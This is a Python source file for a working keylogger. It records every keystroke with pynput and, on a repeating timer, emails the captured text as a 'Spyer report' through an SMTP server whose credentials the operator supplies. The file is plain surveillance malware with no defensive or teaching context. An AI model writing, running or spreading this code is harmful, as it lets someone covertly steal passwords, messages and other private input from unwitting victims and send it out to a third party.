import pynput
import time
import smtplib


class KeyLogger:

    def __init__(self, email_id, email_password, smtp_server_address, smtp_port, interval):
        self.Key_listener = pynput.keyboard.Listener(on_press=self.handle_press)
        self.email_id = email_id
        self.password = email_password
        self.interval = interval
        self.port = smtp_port
        self.server_link = smtp_server_address
        self.buffer = 'Keylogger Started\n'

    def send_email(self):
        print('sendemail')
        msg = f'''
Spyer report
-------------
{self.buffer}
'''
        print(f'\r{msg}')
        server = smtplib.SMTP(self.server_link, self.port)
        server.ehlo()
        server.starttls()
        server.login(self.email_id, self.password)
        server.sendmail(self.email_id, self.email_id, msg)
        self.buffer = ''

    def handle_press(self, e):
        print("handle")
        try:
            self.buffer += e.char
        except AttributeError:
            if str(e) == 'Key.space':
                self.buffer += ' '
            elif str(e) == 'Key.enter':
                self.buffer += '\n'
            elif str(e) == 'Key.tab':
                self.buffer += '\t'
            elif str(e) == 'Key.backspace':
                self.buffer = self.buffer[:-1]
            else:
                self.buffer += '' + str(e) + " "

    def ready(self):
        self.Key_listener.start()
        print("ready")
        while True:
            time.sleep(self.interval)
            self.send_email()

    def start(self):
        print("start")
        self.ready()
        self.Key_listener.join()


if __name__ == "__main__":
    email = ''
    password = ''
    smtp_server_link = ''
    smtp_server_port_number = ''
    time_interval = 1
    spy = KeyLogger(email, password, smtp_server_link, smtp_server_port_number, time_interval)
    spy.start()
